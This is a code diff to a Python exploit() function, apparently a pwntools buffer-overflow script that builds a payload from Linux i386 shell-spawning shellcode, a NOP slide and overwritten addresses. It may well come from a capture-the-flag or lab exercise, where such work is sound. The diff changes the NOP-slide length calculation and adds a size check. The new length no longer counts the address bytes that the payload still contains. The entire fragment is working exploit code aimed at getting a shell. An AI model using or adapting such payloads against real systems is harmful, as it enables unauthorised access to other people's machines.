@@ -67,9 +67,11 @@ def exploit():
     buffer_size = 108
     shellcode = asm(shellcraft.i386.linux.sh())
     nop_slide = b"\x90"
-    number_of_nop_slide = buffer_size - len(addr_of_shellcode) - len(addr_of_first_object) - len(shellcode)
-    
-    
+    number_of_nop_slide = buffer_size - len(shellcode)
+
+    if number_of_nop_slide < 0:
+        raise ValueError("Shellcode is larger than the available buffer space")
+
     payload = addr_of_shellcode + nop_slide * number_of_nop_slide + shellcode + addr_of_first_object
     
     if not LOCAL:
